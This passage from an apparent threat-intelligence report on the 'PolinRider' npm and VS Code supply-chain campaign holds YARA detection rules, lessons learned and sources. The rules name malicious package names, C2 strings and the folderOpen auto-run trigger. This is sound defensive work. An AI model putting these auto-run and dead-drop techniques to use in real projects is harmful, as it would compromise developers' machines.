         ($c2_ip and 1 of ($obf_marker*, $decoder_orig, $decoder_new)))
}
```

### YARA: PolinRider Rollup Polyfill Masquerade
Detects the malicious npm packages masquerading as Rollup polyfill tools, keying on package names combined with C2/staging artifacts.
**Status:** compile ✅ compiles · confidence: high
<!-- audit: yarac exit 0. Package names are published IOCs from JFrog research; condition requires a package name AND a C2/staging indicator to reduce FP (the package name alone in a lockfile could match benignly). -->
```yara
rule PolinRider_Rollup_Polyfill_Masquerade
{
    meta:
        description = "Detects malicious npm packages masquerading as Rollup polyfill tools, used by Lazarus-linked actors for remote access and credential theft"
        author = "Actioner"
        date = "2026-07-06"
        reference = "https://research.jfrog.com/post/rollup-polyfill-masquerading/"
        tlp = "WHITE"
        severity = "high"

    strings:
        $pkg1 = "rollup-packages-polyfill-core" ascii
        $pkg2 = "rollup-runtime-polyfill-core" ascii
        $pkg3 = "swift-parse-stream" ascii
        $pkg4 = "quirky-token" ascii
        $pkg5 = "rollup-plugin-polyfill-connect" ascii
        $pkg6 = "react-icon-svgs" ascii
        $b64_cmd = "bnBtIGluc3RhbGw" ascii
        $spawn_hidden = "windowsHide" ascii
        $c2_endpoint = "/api/service/" ascii
        $jsonkeeper = "jsonkeeper.com" ascii
        $process_marker = "vhost.ctl" ascii

    condition:
        filesize < 2MB and
        (any of ($pkg*) and
         (1 of ($b64_cmd, $spawn_hidden, $c2_endpoint, $jsonkeeper, $process_marker)))
}
```

### YARA: PolinRider VS Code TaskJacker
Detects malicious VS Code tasks.json files with the `folderOpen` auto-run trigger used by the TaskJacker variant.
**Status:** compile ✅ compiles · confidence: low
<!-- audit: yarac exit 0. folderOpen + runOn in a tasks.json is suspicious but not impossible in legitimate VS Code configs; low confidence. Rule targets files under 100KB to reduce noise on large JSON blobs. -->
<!-- revision: downgraded severity from high to low; tightened alternative branch with campaign-specific C2 string to reduce FP on legitimate tasks.json files; added FP entry -->
```yara
rule PolinRider_VSCode_TaskJacker
{
    meta:
        description = "Detects malicious VS Code tasks.json files used by the PolinRider TaskJacker variant to auto-execute payloads when a workspace folder is opened"
        author = "Actioner"
        date = "2026-07-06"
        reference = "https://github.com/OpenSourceMalware/PolinRider"
        tlp = "WHITE"
        severity = "low"

    strings:
        $run_on = "folderOpen" ascii
        $woff2_exec = ".woff2" ascii
        $run_on_key = "runOn" ascii
        $node_exec = "node " ascii
        $c2_vscode1 = "vscode-settings-bootstrap" ascii
        $c2_vscode2 = "vscode-bootstrapper" ascii
        $c2_vscode3 = "vscode-load-config" ascii
        $c2_vscode4 = "vscode-settings-config" ascii
        $font_path = "fa-solid-400" ascii

    condition:
        filesize < 100KB and
        $run_on and $run_on_key and
        ($woff2_exec or $font_path or ($node_exec and 1 of ($c2_vscode*)))

    /* FP note: legitimate VS Code tasks.json files using runOn:folderOpen
       exist but rarely reference .woff2 or these C2 subdomains */
}
```

## Lessons Learned

1. **Blockchain infrastructure as C2 is durable**: Using TRON/Aptos/BSC RPC endpoints as dead-drop resolvers makes traditional domain/IP-based blocking insufficient -- defenders need to monitor for unexpected blockchain RPC traffic from developer machines.

2. **Supply chain attacks are scaling across ecosystems**: PolinRider's expansion from npm alone to Packagist, Go, and Chrome shows threat actors systematically targeting every package ecosystem. Defense-in-depth across all dependency sources is necessary.

3. **Account takeover multiplies blast radius**: Compromising maintainer accounts to push updates to trusted repos bypasses the typosquat detection heuristic. Repository signing, 2FA enforcement, and anomalous commit-pattern detection are critical mitigations.

4. **Developer tooling is a target**: VS Code workspace trust, AI assistant configs, and editor history files are now explicitly targeted -- developer environments need the same security posture as production servers.

## Sources

- [Socket Security - PolinRider Campaign Analysis](https://socket.dev/blog/polinrider-north-korea-linked-supply-chain-campaign-expands) -- primary research source documenting 108 packages across 4 ecosystems
- [JFrog Security Research - Rollup Polyfill Masquerading](https://research.jfrog.com/post/rollup-polyfill-masquerading/) -- detailed analysis of the 6 Rollup polyfill npm packages with C2 infrastructure IOCs
- [The Hacker News - 108 Malicious Packages (July 4)](https://thehackernews.com/2026/07/north-korean-hackers-publish-108.html) -- coverage of the expanded PolinRider campaign
- [The Hacker News - Rollup Polyfill Packages (July 3)](https://thehackernews.com/2026/07/north-korea-linked-npm-packages-mimic.html) -- coverage of the Rollup masquerading cluster
- [OpenSourceMalware/PolinRider GitHub](https://github.com/OpenSourceMalware/PolinRider) -- technical dossier with package lists, obfuscator analysis, C2 infrastructure, and IOC tracker
- [Rescana Active Exploitation Alert](https://www.rescana.com/post/active-exploitation-alert-north-korean-polinrider-supply-chain-attack-targets-npm-packagist-go-modules-and-chrome-extens) -- exploitation alert with detection guidance
- [Apache Superset Issue #39299](https://github.com/apache/superset/issues/39299) -- real-world example of PolinRider targeting a major open source project

---
*Report generated by Actioner*
